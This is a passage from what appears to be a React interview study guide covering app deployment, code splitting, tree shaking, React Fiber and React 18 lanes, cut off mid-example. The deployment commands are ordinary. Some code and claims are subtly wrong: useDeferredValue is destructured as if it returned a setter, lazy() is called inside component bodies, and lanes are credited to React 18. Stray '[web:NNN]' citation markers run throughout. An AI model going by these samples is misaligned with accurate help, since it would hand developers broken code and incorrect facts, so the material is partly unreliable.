// - Default Root Object: index.html
// - Custom Error Responses: 404 → /index.html (for SPA routing)

// Automate with script:
#!/bin/bash
npm run build
aws s3 sync build/ s3://my-react-app --delete
aws cloudfront create-invalidation --distribution-id YOUR_DIST_ID --paths "/*"

// Or use AWS Amplify (easier)
npm install -g @aws-amplify/cli

amplify init
amplify add hosting
amplify publish

Docker Deployment:
------------------

// Dockerfile
# Build stage
FROM node:18-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

# Production stage
FROM nginx:alpine
COPY --from=build /app/build /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]

// nginx.conf (for SPA routing)
server {
    listen 80;
    location / {
        root /usr/share/nginx/html;
        index index.html;
        try_files $uri $uri/ /index.html;
    }
}

// Build and run
docker build -t my-react-app .
docker run -p 80:80 my-react-app

// Deploy to Docker Hub
docker tag my-react-app username/my-react-app
docker push username/my-react-app

Firebase Hosting:
-----------------

// 1. Install Firebase CLI
npm install -g firebase-tools

// 2. Login
firebase login

// 3. Initialize
firebase init hosting

// Select options:
// - Public directory: build
// - Single-page app: Yes
// - Automatic builds with GitHub: Optional

// 4. Build app
npm run build

// 5. Deploy
firebase deploy

// firebase.json
{
  "hosting": {
    "public": "build",
    "ignore": ["firebase.json", "** /.*", "** /node_modules/**"],
    "rewrites": [
      {
        "source": "**",
        "destination": "/index.html"
      }
    ]
  }
}

Heroku Deployment:
------------------

// 1. Create server.js (serve static files)
const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(path.join(__dirname, 'build')));

app.get('/*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));

// 2. Update package.json
{
  "scripts": {
    "start": "node server.js",
    "build": "react-scripts build",
    "heroku-postbuild": "npm run build"
  },
  "engines": {
    "node": "18.x"
  }
}

// 3. Create Procfile
web: node server.js

// 4. Deploy
heroku create my-react-app
git push heroku main

DigitalOcean App Platform:
---------------------------

// 1. Push to GitHub
// 2. Create app in DigitalOcean dashboard
// 3. Select repository
// 4. Configure:
//    - Type: Static Site
//    - Build Command: npm run build
//    - Output Directory: build
// 5. Deploy!

// .do/app.yaml (optional)
name: my-react-app
static_sites:
  - name: frontend
    build_command: npm run build
    output_dir: build
    routes:
      - path: /
    environment_slug: node-js

Comparison:
-----------

// Platform     | Ease | Cost      | Features
// -------------|------|-----------|------------------
// Netlify      | ⭐⭐⭐⭐⭐ | Free tier | Auto-deploy, forms, functions
// Vercel       | ⭐⭐⭐⭐⭐ | Free tier | Auto-deploy, serverless, analytics
// GitHub Pages | ⭐⭐⭐⭐   | Free      | Simple, git-based
// AWS S3       | ⭐⭐⭐    | Low cost  | Scalable, CloudFront CDN
// Firebase     | ⭐⭐⭐⭐   | Free tier | Auth, DB, hosting together
// Heroku       | ⭐⭐⭐    | Paid      | Full backend support
// Docker       | ⭐⭐     | Varies    | Full control, portable

// Recommendation:
// - Simple project: Netlify or Vercel
// - GitHub repo: GitHub Pages
// - Need backend: Heroku or AWS
// - Enterprise: AWS or Docker
// - Firebase services: Firebase Hosting

CI/CD Pipeline Example:
-----------------------

// .github/workflows/deploy.yml
name: Deploy to Netlify
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup Node
        uses: actions/setup-node@v2
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run tests
        run: npm test
      
      - name: Build
        run: npm run build
        env:
          REACT_APP_API_URL: ${{ secrets.API_URL }}
      
      - name: Deploy to Netlify
        uses: netlify/actions/cli@master
        env:
          NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
          NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
        with:
          args: deploy --prod --dir=build

Summary:

React Deployment:
- Build with npm run build
- Deploy static files to hosting
- Netlify/Vercel: Easiest, auto-deploy
- GitHub Pages: Free for open source
- AWS S3: Scalable, professional
- Docker: Full control
- Set environment variables per platform
- Configure SPA routing (/* → index.html)
- Use CI/CD for automation
*/


/**
107. What is code splitting and lazy loading in React?
-----------------------------------------------------

Code splitting breaks your app into smaller chunks that can be loaded on demand,
rather than loading everything upfront. Lazy loading is the technique of loading
these chunks only when needed, improving initial load time and performance.

The Problem:
------------

// Without code splitting: [web:186]
// All code in one bundle

import Home from './Home';
import About from './About';
import Dashboard from './Dashboard';
import Profile from './Profile';
import Settings from './Settings';
// ... 50 more imports

function App() {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <Route path="/about" element={<About />} />
      <Route path="/dashboard" element={<Dashboard />} />
      {/* ... * /}
    </Routes>
  );
}

// Result: Single 500KB bundle
// User visits homepage → downloads entire 500KB
// Most code not needed for homepage!

React.lazy and Suspense:
------------------------

// Solution: Code split with React.lazy [web:186]

import { lazy, Suspense } from 'react';

// Lazy load components [web:186]
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));
const Dashboard = lazy(() => import('./Dashboard'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/dashboard" element={<Dashboard />} />
      </Routes>
    </Suspense>
  );
}

// Now:
// - Homepage: Loads 50KB (Home chunk)
// - About page: Loads 30KB (About chunk)
// - Dashboard: Loads 100KB (Dashboard chunk)
// User only downloads what they need! [web:186]

How React.lazy Works:
---------------------

// React.lazy takes a function that returns dynamic import()
const LazyComponent = lazy(() => import('./Component'));

// Equivalent to:
const LazyComponent = lazy(() => {
  return import('./Component');
});

// Dynamic import() returns a Promise
import('./Component').then(module => {
  // module.default is the component
});

// React.lazy handles this Promise automatically

Suspense Fallback:
------------------

// Suspense shows fallback while loading [web:186]

function App() {
  return (
    <Suspense fallback={<LoadingSpinner />}>
      <LazyComponent />
    </Suspense>
  );
}

// Multiple lazy components share Suspense
function App() {
  return (
    <Suspense fallback={<div>Loading page...</div>}>
      <LazyHeader />
      <LazyContent />
      <LazyFooter />
    </Suspense>
  );
}

// Nested Suspense for granular loading
function App() {
  return (
    <Suspense fallback={<AppSkeleton />}>
      <Header />
      
      <Suspense fallback={<ContentSkeleton />}>
        <LazyContent />
      </Suspense>
      
      <Suspense fallback={<SidebarSkeleton />}>
        <LazySidebar />
      </Suspense>
    </Suspense>
  );
}

Route-Based Code Splitting:
----------------------------

// Split by routes [web:186]

import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Lazy load route components [web:186]
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Products = lazy(() => import('./pages/Products'));
const ProductDetail = lazy(() => import('./pages/ProductDetail'));
const Dashboard = lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<PageLoader />}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/products" element={<Products />} />
          <Route path="/products/:id" element={<ProductDetail />} />
          <Route path="/dashboard" element={<Dashboard />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// User visits /products → only Products chunk loads [web:186]

Component-Based Code Splitting:
--------------------------------

// Split large components [web:186]

function HomePage() {
  const [showModal, setShowModal] = useState(false);
  
  // Lazy load modal (only when opened) [web:186]
  const Modal = lazy(() => import('./Modal'));
  
  return (
    <div>
      <h1>Home Page</h1>
      <button onClick={() => setShowModal(true)}>
        Open Modal
      </button>
      
      {showModal && (
        <Suspense fallback={<ModalSkeleton />}>
          <Modal onClose={() => setShowModal(false)} />
        </Suspense>
      )}
    </div>
  );
}

// Modal code only loads when user clicks button [web:186]

Library Code Splitting:
------------------------

// Split heavy libraries

// Before: Chart.js loaded on every page
import Chart from 'chart.js';

function Dashboard() {
  return <Chart data={data} />;
}

// After: Chart.js only loads on Dashboard
const Chart = lazy(() => import('chart.js').then(module => ({
  default: module.Chart
})));

function Dashboard() {
  return (
    <Suspense fallback={<ChartSkeleton />}>
      <Chart data={data} />
    </Suspense>
  );
}

Named Exports:
--------------

// React.lazy only works with default exports

// ❌ Doesn't work with named exports
const MyComponent = lazy(() => import('./components')); // Has named exports

// ✅ Solution: Re-export as default
const MyComponent = lazy(() =>
  import('./components').then(module => ({
    default: module.MyComponent
  }))
);

// Or create intermediate file:
// MyComponent.js
export { MyComponent as default } from './components';

// App.js
const MyComponent = lazy(() => import('./MyComponent'));

Error Boundaries:
-----------------

// Handle loading errors

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  render() {
    if (this.state.hasError) {
      return <div>Something went wrong loading the page.</div>;
    }
    
    return this.props.children;
  }
}

// Use with Suspense
function App() {
  return (
    <ErrorBoundary>
      <Suspense fallback={<Loading />}>
        <LazyComponent />
      </Suspense>
    </ErrorBoundary>
  );
}

Preloading:
-----------

// Preload chunks before needed

// Component.js
export const preload = () => import('./HeavyComponent');

export default function Component() {
  const HeavyComponent = lazy(() => import('./HeavyComponent'));
  
  return (
    <div
      onMouseEnter={() => preload()} // Preload on hover
    >
      <Suspense fallback={<Loading />}>
        <HeavyComponent />
      </Suspense>
    </div>
  );
}

Real-World Example:
-------------------

// E-commerce app with code splitting

import { lazy, Suspense } from 'react';

// Core pages loaded immediately
import Header from './components/Header';
import Footer from './components/Footer';

// Lazy load routes [web:186]
const HomePage = lazy(() => import('./pages/HomePage'));
const ProductList = lazy(() => import('./pages/ProductList'));
const ProductDetail = lazy(() => import('./pages/ProductDetail'));
const Cart = lazy(() => import('./pages/Cart'));
const Checkout = lazy(() => import('./pages/Checkout'));
const UserProfile = lazy(() => import('./pages/UserProfile'));

// Heavy components lazy loaded
const ReviewsSection = lazy(() => import('./components/ReviewsSection'));
const RelatedProducts = lazy(() => import('./components/RelatedProducts'));

function App() {
  return (
    <div>
      <Header /> {/* Always loaded * /}
      
      <Suspense fallback={<PageSkeleton />}>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/products" element={<ProductList />} />
          <Route path="/products/:id" element={<ProductDetail />} />
          <Route path="/cart" element={<Cart />} />
          <Route path="/checkout" element={<Checkout />} />
          <Route path="/profile" element={<UserProfile />} />
        </Routes>
      </Suspense>
      
      <Footer /> {/* Always loaded * /}
    </div>
  );
}

function ProductDetail() {
  return (
    <div>
      <ProductInfo />
      
      {/* Lazy load below-the-fold content [web:186] * /}
      <Suspense fallback={<ReviewsSkeleton />}>
        <ReviewsSection />
      </Suspense>
      
      <Suspense fallback={<ProductsSkeleton />}>
        <RelatedProducts />
      </Suspense>
    </div>
  );
}

When to Code Split:
-------------------

// ✅ Good candidates for code splitting: [web:186]

// 1. Routes (different pages)
const Dashboard = lazy(() => import('./Dashboard'));

// 2. Modal/Dialog components
const Modal = lazy(() => import('./Modal'));

// 3. Heavy third-party libraries
const Editor = lazy(() => import('react-quill'));

// 4. Below-the-fold content [web:186]
const Comments = lazy(() => import('./Comments'));

// 5. Admin/authenticated features
const AdminPanel = lazy(() => import('./AdminPanel'));

// 6. Conditional features
const AdvancedFeature = lazy(() => import('./AdvancedFeature'));

// ❌ Don't code split: [web:186]

// 1. Critical content (above the fold)
// - Header, main content, hero sections [web:186]

// 2. Small components
// - Not worth the overhead

// 3. Frequently used components
// - Better to load upfront

Performance Impact:
-------------------

// Before code splitting:
// Initial bundle: 500KB
// Time to Interactive: 3s

// After code splitting: [web:186]
// Initial bundle: 100KB (80% reduction)
// Homepage chunk: 50KB
// About chunk: 30KB
// Dashboard chunk: 150KB
// Time to Interactive: 0.8s (4x faster!) [web:186]

Bundle Analysis:
----------------

// Analyze bundle size
npm run build -- --stats

// Use webpack-bundle-analyzer
npm install --save-dev webpack-bundle-analyzer

// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer build/bundle-stats.json"
  }
}

// Identify large chunks to split [web:186]

Summary:

Code Splitting & Lazy Loading:
- Break app into smaller chunks [web:186]
- Load only what's needed [web:186]
- Use React.lazy() for components [web:186]
- Wrap with Suspense [web:186]
- Split by routes [web:186]
- Split large components [web:186]
- Improves initial load time [web:186]
- Better user experience [web:186]
- Use strategically [web:186]
*/


/**
108. What is tree shaking in React apps?
----------------------------------------

Tree shaking is a build optimization technique that removes unused code
(dead code) from the final JavaScript bundle. It's called "tree shaking"
because it shakes off dead leaves (unused code) from the dependency tree.

How Tree Shaking Works:
------------------------

// Modern build tools (Webpack, Rollup, etc.) analyze code
// Remove code that's imported but never used

// math.js
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

export function multiply(a, b) {
  return a * b;
}

export function divide(a, b) {
  return a / b;
}

// App.js
import { add, subtract } from './math';

console.log(add(2, 3)); // Used
// subtract is imported but never used
// multiply and divide never imported

// After tree shaking: [web:187]
// Only add() included in bundle
// subtract(), multiply(), divide() removed
// Smaller bundle size!

ES6 Modules Required:
---------------------

// Tree shaking only works with ES6 modules [web:190]

// ✅ Works with ES6 imports/exports
import { Component } from 'react';
export function MyFunction() {}

// ❌ Doesn't work with CommonJS
const React = require('react');
module.exports = function MyFunction() {}

// Why? ES6 modules are statically analyzable
// Build tools can determine what's used at compile time

React and Tree Shaking:
-----------------------

// React is tree-shakeable

// Before tree shaking:
import React from 'react';

// Imports entire React library (~100KB)

// After tree shaking:
import { useState, useEffect } from 'react';

// Only imports used hooks
// Unused React features removed
// Smaller bundle!

// Modern React (17+) even better:
// No need to import React for JSX
// Automatic JSX runtime
// Further bundle size reduction

Library Examples:
-----------------

// Example 1: Lodash

// ❌ Bad: Imports entire library (70KB)
import _ from 'lodash';
_.debounce(func, 100);

// ✅ Good: Import only what's needed (5KB)
import debounce from 'lodash/debounce';
debounce(func, 100);

// ✅ Even better: Use lodash-es (ES6 modules)
import { debounce } from 'lodash-es';
debounce(func, 100);

// Example 2: Material-UI

// ❌ Bad: Imports entire library
import { Button, TextField } from '@material-ui/core';

// ✅ Good: Individual imports
import Button from '@material-ui/core/Button';
import TextField from '@material-ui/core/TextField';

// Example 3: Date-fns

// ✅ Good: Already ES6 modules, tree-shakeable
import { format, addDays } from 'date-fns';

package.json sideEffects:
--------------------------

// Tell bundler which files have side effects [web:187][web:190]

// package.json
{
  "name": "my-library",
  "sideEffects": false  // No side effects, tree shake everything
}

// Or specify files with side effects:
{
  "sideEffects": [
    "*.css",
    "*.scss",
    "./src/polyfills.js"
  ]
}

// Side effect: Code that does something when imported [web:190]

// sideEffect.js
console.log('This runs on import!'); // Side effect
window.myGlobal = 'value'; // Side effect

export function myFunction() {} // No side effect

// If file has side effects, bundler keeps it
// Even if nothing is used from it [web:190]

Production Mode:
----------------

// Tree shaking enabled in production mode

// package.json
{
  "scripts": {
    "build": "react-scripts build" // Production mode
  }
}

// Webpack production mode:
// - Enables tree shaking
// - Minification
// - Dead code elimination

// Create React App handles this automatically

Tree Shaking in Action:
------------------------

// components.js
export function Button() {
  return <button>Click</button>;
}

export function Input() {
  return <input />;
}

export function Select() {
  return <select></select>;
}

export function Checkbox() {
  return <input type="checkbox" />;
}

// App.js
import { Button, Input } from './components';

function App() {
  return (
    <div>
      <Button />
      <Input />
    </div>
  );
}

// Build output includes:
// ✅ Button (used)
// ✅ Input (used)
// ❌ Select (removed - unused)
// ❌ Checkbox (removed - unused)

CSS Tree Shaking:
-----------------

// Remove unused CSS

// ❌ Problem: All CSS loaded
import './styles.css'; // 500KB

// ✅ Solution: CSS Modules (scoped CSS)
import styles from './Component.module.css';

function Component() {
  return <div className={styles.container}>Content</div>;
}

// Only used classes included

// ✅ Better: Tailwind CSS with PurgeCSS
// tailwind.config.js
module.exports = {
  purge: ['./src/** /*.{js,jsx,ts,tsx}'],
  // Scans files, removes unused Tailwind classes
};

// Result: 3MB → 10KB

Analyzing Bundle:
-----------------

// Check what's in your bundle

// 1. Build with stats
npm run build -- --stats

// 2. Analyze with webpack-bundle-analyzer
npm install --save-dev webpack-bundle-analyzer

// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer build/bundle-stats.json"
  }
}

npm run analyze

// Opens visual representation:
// - See all dependencies
// - Identify large libraries
// - Find optimization opportunities

Optimization Tips:
------------------

// 1. Use ES6 imports [web:190]
// ✅ Good
import { feature } from 'library';

// ❌ Bad
const library = require('library');

// 2. Import only what you need
// ✅ Good
import { useState } from 'react';

// ❌ Bad
import React from 'react';
React.useState();

// 3. Use ES6 module versions of libraries
// lodash → lodash-es
// moment → date-fns

// 4. Configure sideEffects in package.json [web:187][web:190]
{
  "sideEffects": ["*.css"]
}

// 5. Use dynamic imports for code splitting
const Component = lazy(() => import('./Component'));

// 6. Avoid barrel files (index.js that re-exports)
// ❌ Bad: components/index.js
export { Button } from './Button';
export { Input } from './Input';
// ... 50 components

// Importing one imports all (bundle analysis)
import { Button } from './components';

// ✅ Good: Import directly
import { Button } from './components/Button';

Common Issues:
--------------

// 1. CommonJS modules not tree-shakeable
// Solution: Use ES6 version or replace library

// 2. Default imports include everything
// Solution: Use named imports

// 3. Side effects prevent tree shaking [web:190]
// Solution: Mark sideEffects in package.json [web:187]

// 4. Dynamic imports prevent static analysis
// Solution: Use when needed, but know the trade-off

Summary:

Tree Shaking:
- Removes unused code [web:187][web:190]
- Reduces bundle size [web:190]
- Works with ES6 modules [web:190]
- Production mode only
- Configure sideEffects [web:187][web:190]
- Use named imports
- Choose tree-shakeable libraries
- Analyze bundle to optimize
- Automatic in Create React App
*/





/**
109. What is React Fiber and why was it introduced?
--------------------------------------------------

React Fiber is a complete rewrite of React's reconciliation algorithm introduced
in React 16. It enables React to break rendering work into chunks and prioritize
updates, making React more responsive and capable of handling complex UIs.

What is React Fiber:
--------------------

// Fiber is React's internal data structure [web:141]
// Each React element becomes a "fiber" node

// Old React (Stack Reconciler):
// - Recursive algorithm [web:143]
// - Processes entire tree at once [web:143]
// - Cannot pause/interrupt [web:143]
// - Long updates block UI [web:143]

// New React (Fiber Reconciler):
// - Incremental algorithm [web:141][web:144]
// - Can pause and resume work [web:141][web:142]
// - Can prioritize updates [web:141]
// - Can interrupt low-priority work [web:141]
// - Keeps UI responsive [web:143]

Why Fiber Was Introduced:
--------------------------

// Problem 1: Blocking updates [web:143]
function App() {
  const [count, setCount] = useState(0);
  
  // Imagine this renders 10,000 items
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>
        Update {count}
      </button>
      
      {/* This takes 500ms to render * /}
      <ExpensiveComponent count={count} />
    </div>
  );
}

// Old React (Stack):
// Click button → UI freezes for 500ms → update shows [web:143]
// Can't interact during update!

// New React (Fiber):
// Click button → Update starts → UI stays responsive [web:141]
// Can interrupt if higher priority work comes in

// Problem 2: All updates treated equally [web:143]
// No way to prioritize:
// - User input (high priority)
// - Animations (high priority)  
// - Data fetching (low priority)
// - Off-screen content (lowest priority)

// Fiber solution: Priority-based scheduling [web:141]

Fiber Architecture:
-------------------

// Each component becomes a fiber node [web:141][web:144]

// Fiber node structure (simplified):
{
  type: 'div',              // Component type
  key: 'unique-key',        // Unique identifier
  stateNode: DOMElement,    // Actual DOM node
  child: ChildFiber,        // First child
  sibling: SiblingFiber,    // Next sibling
  return: ParentFiber,      // Parent fiber
  
  // Work-related
  pendingProps: {},         // New props
  memoizedProps: {},        // Previous props
  memoizedState: {},        // Previous state
  updateQueue: [],          // Pending updates
  
  // Priority
  lanes: 0b000001,          // Update priority
  
  // Effects
  flags: 0b010100,          // What needs to be done
  subtreeFlags: 0b001000    // Child effects
}

// Fiber tree structure:
//        App (parent)
//         |
//      Header (child)
//         |
//      --------
//      |      |
//   Logo   Nav (siblings)

Fiber Tree Example:
-------------------

function App() {
  return (
    <div>
      <Header />
      <Main>
        <Article />
        <Sidebar />
      </Main>
      <Footer />
    </div>
  );
}

// Fiber tree (linked list structure): [web:141]
//
//     App
//      |
//     div
//      |
//   Header -> Main -> Footer
//              |
//          Article -> Sidebar

// Traversal using child/sibling/return pointers [web:141]
// Can pause at any node, resume later

Two-Phase Rendering:
--------------------

// Fiber splits rendering into two phases [web:142][web:147]

// Phase 1: Render Phase (Reconciliation) [web:142][web:147]
// - Can be interrupted [web:142]
// - Async, can pause/resume [web:142]
// - Builds fiber tree [web:144]
// - Calculates what changed [web:147]
// - No side effects [web:142]

function renderPhase() {
  // Compare old and new fiber trees [web:144]
  // Mark which nodes need updates [web:147]
  // Can pause if higher priority work arrives [web:142]
  // Can split work across multiple frames [web:141]
}

// Phase 2: Commit Phase [web:142][web:147]
// - Cannot be interrupted [web:142]
// - Synchronous [web:142]
// - Apply changes to DOM [web:147]
// - Run side effects (useEffect) [web:142]
// - Must complete once started [web:142]

function commitPhase() {
  // Apply all DOM updates at once [web:147]
  // Run lifecycle methods
  // Run useEffect callbacks
  // Update refs
}

How Fiber Works:
----------------

// Example: Updating a large list

function App() {
  const [items, setItems] = useState([...Array(10000)]);
  
  return (
    <div>
      <button onClick={() => setItems([...items, 'new'])}>
        Add Item
      </button>
      
      {items.map((item, i) => (
        <ExpensiveItem key={i} item={item} />
      ))}
    </div>
  );
}

// Without Fiber (Old React): [web:143]
// 1. Click button
// 2. Start reconciliation
// 3. Process all 10,000 items (takes 500ms)
// 4. UI frozen during this time
// 5. Update DOM
// 6. UI responsive again

// With Fiber (New React): [web:141][web:142]
// 1. Click button
// 2. Start reconciliation (Render Phase)
// 3. Process chunk of items (16ms) [web:141]
// 4. Pause, let browser handle other tasks
// 5. Resume processing next chunk
// 6. Repeat until done
// 7. Commit all changes at once (Commit Phase)
// 8. UI stays responsive throughout!

Work Loop:
----------

// Simplified Fiber work loop [web:141]

function workLoop(deadline) {
  // Process work units until out of time [web:141]
  while (nextUnitOfWork && deadline.timeRemaining() > 1) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
  }
  
  // If more work, schedule next chunk [web:141]
  if (nextUnitOfWork) {
    requestIdleCallback(workLoop);
  } else {
    // All work done, commit to DOM [web:142]
    commitRoot();
  }
}

// Start work loop
requestIdleCallback(workLoop);

// Each "unit of work" is processing one fiber node [web:141]

Priority and Interruption:
---------------------------

// Fiber can interrupt low-priority work [web:141]

function App() {
  const [search, setSearch] = useState('');
  const [results, setResults] = useState([]);
  
  return (
    <div>
      {/* High priority: User input [web:141] * /}
      <input
        value={search}
        onChange={(e) => setSearch(e.target.value)}
      />
      
      {/* Low priority: Search results [web:141] * /}
      <SearchResults query={search} />
    </div>
  );
}

// Scenario:
// 1. Typing in input (high priority) [web:141]
// 2. SearchResults rendering (low priority) [web:141]
// 3. User types → Fiber pauses SearchResults [web:141]
// 4. Process keystroke immediately [web:141]
// 5. Resume SearchResults rendering [web:141]

// Old React: Keystroke delayed until SearchResults done [web:143]
// New React: Keystroke handled immediately [web:141]

Benefits of Fiber:
------------------

// 1. Responsive UI [web:143]
// Long updates don't freeze the app [web:141]

// 2. Prioritization [web:141]
// Handle urgent updates first (user input, animations)
// Defer less important work (analytics, logging)

// 3. Better error handling
// Error boundaries work better
// Can recover from errors mid-render

// 4. Suspense and Concurrent Features [web:141]
// Enables Suspense for data fetching
// Concurrent rendering
// useTransition
// useDeferredValue

// 5. Time slicing [web:141]
// Split work across multiple frames
// Keeps frame rate smooth

// 6. Incremental rendering [web:141]
// Render part of tree, pause, continue later

Real-World Impact:
------------------

// Before Fiber (React 15): [web:143]
function HeavyComponent() {
  // Rendering 10,000 items blocks UI for 500ms
  return items.map(item => <Item key={item.id} {...item} />);
}
// Result: Stuttering animations, delayed input [web:143]

// After Fiber (React 16+): [web:141]
function HeavyComponent() {
  // Same code, but Fiber breaks work into chunks [web:141]
  return items.map(item => <Item key={item.id} {...item} />);
}
// Result: Smooth animations, responsive input [web:141]

Fiber Reconciliation Algorithm:
--------------------------------

// Fiber reconciliation process [web:144][web:147]

// 1. Create work-in-progress tree [web:144]
currentFiber = {
  type: 'div',
  props: { children: [<A />, <B />] }
};

workInProgressFiber = cloneFiber(currentFiber);

// 2. Compare with previous tree [web:144][web:147]
function reconcile(current, workInProgress) {
  // Compare props [web:144]
  if (propsChanged(current, workInProgress)) {
    markUpdate(workInProgress);
  }
  
  // Reconcile children [web:144]
  reconcileChildren(current, workInProgress);
  
  return workInProgress.child; // Next unit of work [web:141]
}

// 3. Mark effects (what changed) [web:147]
workInProgressFiber.flags |= Update;

// 4. Build effect list (changes to apply) [web:142]
// Only nodes with changes tracked

// 5. Commit effects to DOM [web:142][web:147]
commitWork(effectList);

Summary:

React Fiber:
- Complete rewrite of reconciliation [web:141][web:143]
- Introduced in React 16 [web:143]
- Enables incremental rendering [web:141]
- Can pause and resume work [web:141][web:142]
- Prioritizes updates [web:141]
- Two-phase rendering [web:142][web:147]
- Render phase (interruptible) [web:142]
- Commit phase (synchronous) [web:142]
- Enables Concurrent features [web:141]
- Keeps UI responsive [web:143]
*/


/**
110. What are lanes in React 18?
--------------------------------

Lanes are React's internal priority system introduced in React 18 for scheduling
and prioritizing updates. They replace the old priority system and provide
fine-grained control over which updates should be processed and in what order.

What are Lanes:
---------------

// Lanes are bit masks representing update priorities [web:191][web:194]

// Binary representation (simplified):
const SyncLane =             0b0000000000000000000000000000001; // Highest
const InputContinuousLane =  0b0000000000000000000000000000100;
const DefaultLane =          0b0000000000000000000000000010000;
const TransitionLane1 =      0b0000000000000000000000001000000;
const TransitionLane2 =      0b0000000000000000000000010000000;
const RetryLane1 =           0b0000000000000001000000000000000;
const IdleLane =             0b0100000000000000000000000000000; // Lowest

// Multiple lanes can be active simultaneously [web:191]
const lanes = SyncLane | DefaultLane; // Both lanes active

Lane Priority Levels:
---------------------

// From highest to lowest priority: [web:194]

// 1. SyncLane - Synchronous updates (highest) [web:191]
// - User input in controlled components
// - Discrete user events (clicks)
// - Must process immediately

// 2. InputContinuousLane - Continuous input
// - Mouse move
// - Scroll events
// - Touch move

// 3. DefaultLane - Normal updates [web:191]
// - setState from useEffect
// - Network responses
// - Regular component updates

// 4. TransitionLanes - Transitions (low priority) [web:191]
// - useTransition updates
// - Can be interrupted
// - Multiple transition lanes for parallel work [web:191]

// 5. RetryLanes - Retry after error
// - Suspense retries
// - Error recovery

// 6. IdleLane - Idle work (lowest)
// - Background tasks
// - Analytics
// - Non-urgent work

How Lanes Work:
---------------

// Example: Multiple updates with different priorities

function App() {
  const [count, setCount] = useState(0);
  const [search, setSearch] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleClick = () => {
    // High priority (SyncLane) [web:191]
    setCount(c => c + 1);
    
    // Low priority (TransitionLane) [web:191]
    startTransition(() => {
      setSearch('updated');
    });
  };
  
  return (
    <div>
      {/* count updates immediately [web:191] * /}
      <div>Count: {count}</div>
      
      {/* search updates can be interrupted [web:191] * /}
      <SearchResults search={search} />
    </div>
  );
}

// Execution:
// 1. User clicks button
// 2. setCount assigned SyncLane (high priority) [web:191]
// 3. startTransition assigned TransitionLane (low priority) [web:191]
// 4. SyncLane processed first [web:191]
// 5. TransitionLane can be interrupted by new high-priority work [web:191]

Lane Assignment:
----------------

// React assigns lanes based on context [web:194]

// Discrete events (click, keydown) → SyncLane [web:191]
button.addEventListener('click', () => {
  setState(newValue); // SyncLane
});

// Continuous events (scroll, mouse move) → InputContinuousLane
window.addEventListener('scroll', () => {
  setState(scrollY); // InputContinuousLane
});

// Transitions → TransitionLane [web:191]
startTransition(() => {
  setState(newValue); // TransitionLane
});

// Default updates → DefaultLane [web:191]
useEffect(() => {
  setState(newValue); // DefaultLane
}, []);

// Timeouts → varies based on delay
setTimeout(() => {
  setState(newValue); // Lower priority
}, 1000);

Multiple Transitions:
---------------------

// Each transition can get its own lane [web:191]

function SearchApp() {
  const [query, setQuery] = useState('');
  const [category, setCategory] = useState('all');
  
  // Transition 1 [web:191]
  const updateQuery = (value) => {
    startTransition(() => {
      setQuery(value); // TransitionLane1
    });
  };
  
  // Transition 2 [web:191]
  const updateCategory = (value) => {
    startTransition(() => {
      setCategory(value); // TransitionLane2 (different lane)
    });
  };
  
  return (
    <div>
      <input onChange={(e) => updateQuery(e.target.value)} />
      <CategoryFilter onChange={updateCategory} />
      <Results query={query} category={category} />
    </div>
  );
}

// Benefits of separate lanes: [web:191]
// - Can finish independently [web:191]
// - Can render out of order [web:191]
// - Better performance for multiple transitions [web:191]

Lane Batching:
--------------

// Updates in same lane batch together [web:191]

function Component() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  
  const handleClick = () => {
    // Both SyncLane → batch together [web:191]
    setA(1);
    setB(2);
    // Only one render!
  };
  
  return <div>{a} {b}</div>;
}

// Same lane = always batch [web:191]
// Different lanes = may render separately [web:191]

Priority Comparison:
--------------------

// Three priority systems in React: [web:194]

// 1. Scheduler Priority (task scheduling) [web:194]
const ImmediatePriority = 1;
const UserBlockingPriority = 2;
const NormalPriority = 3;
const LowPriority = 4;
const IdlePriority = 5;

// 2. Event Priority (user interactions) [web:194]
const DiscreteEventPriority = 1;  // Click, keydown
const ContinuousEventPriority = 2; // Scroll, mouse move
const DefaultEventPriority = 3;    // Regular updates

// 3. Lane Priority (update scheduling) [web:194]
// 31 lanes for fine-grained priority [web:194]

// Mapping: Lane → Event Priority → Scheduler Priority [web:194]

Real-World Example:
-------------------

function SearchPage() {
  const [searchQuery, setSearchQuery] = useState('');
  const [deferredQuery, setDeferredQuery] = useDeferredValue(searchQuery);
  const [isPending, startTransition] = useTransition();
  
  const handleInput = (e) => {
    // High priority: Update input immediately (SyncLane) [web:191]
    setSearchQuery(e.target.value);
    
    // Low priority: Update results (TransitionLane) [web:191]
    startTransition(() => {
      setDeferredQuery(e.target.value);
    });
  };
  
